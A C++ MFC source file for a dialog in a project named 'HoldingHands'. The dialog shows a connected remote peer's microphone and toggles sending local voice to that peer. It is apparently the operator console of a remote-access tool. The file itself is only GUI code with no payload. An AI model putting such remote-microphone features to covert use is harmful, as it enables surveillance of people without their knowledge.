// AudioDlg.cpp : 实现文件
//

#include "stdafx.h"
#include "HoldingHands.h"
#include "AudioDlg.h"
#include "afxdialogex.h"
#include "AudioSrv.h"

// CAudioDlg 对话框

IMPLEMENT_DYNAMIC(CAudioDlg, CDialogEx)

CAudioDlg::CAudioDlg(CAudioSrv*pHandler, CWnd* pParent /*=NULL*/)
: CDialogEx(CAudioDlg::IDD, pParent),
m_DestroyAfterDisconnect(FALSE),
m_pHandler(pHandler)
{

}

CAudioDlg::~CAudioDlg()
{
}

void CAudioDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialogEx::DoDataExchange(pDX);
	DDX_Control(pDX, IDC_CHECK1, m_ListenLocal);
}


BEGIN_MESSAGE_MAP(CAudioDlg, CDialogEx)
	ON_WM_CLOSE()
	ON_MESSAGE(WM_AUDIO_ERROR,OnError)
	ON_BN_CLICKED(IDC_CHECK1, &CAudioDlg::OnBnClickedCheck1)
END_MESSAGE_MAP()


// CAudioDlg 消息处理程序


void CAudioDlg::PostNcDestroy()
{
	// TODO:  在此添加专用代码和/或调用基类
	CDialogEx::PostNcDestroy();
	if (!m_DestroyAfterDisconnect){
		delete this;
	}
}


void CAudioDlg::OnClose()
{
	// TODO:  在此添加消息处理程序代码和/或调用默认值
	if (m_pHandler){
		m_DestroyAfterDisconnect = TRUE;
		m_pHandler->Close();
	}
	else{
		//m_pHandler已经没了,现在只管自己就行.
		DestroyWindow();
	}
}

void CAudioDlg::OnOK()
{
}


void CAudioDlg::OnCancel()
{
}


BOOL CAudioDlg::OnInitDialog()
{
	CDialogEx::OnInitDialog();
	auto const peer = m_pHandler->GetPeerName();
	CString Title;
	Title.Format(TEXT("[%s] Microphone"), CA2W(peer.first.c_str()).m_psz);
	SetWindowText(Title);
	return TRUE;  // return TRUE unless you set the focus to a control
	// 异常:  OCX 属性页应返回 FALSE
}

LRESULT CAudioDlg::OnError(WPARAM wParam, LPARAM lParam)
{
	TCHAR*szError = (TCHAR*)wParam;
	MessageBox(szError, TEXT("Error"),MB_OK|MB_ICONINFORMATION);
	return 0;
}


void CAudioDlg::OnBnClickedCheck1()
{
	if (m_ListenLocal.GetCheck()){
		if (m_pHandler){
			m_pHandler->StartSendLocalVoice();
		}
	}
	else{
		if (m_pHandler){
			m_pHandler->StopSendLocalVoice();
		}
	}
}
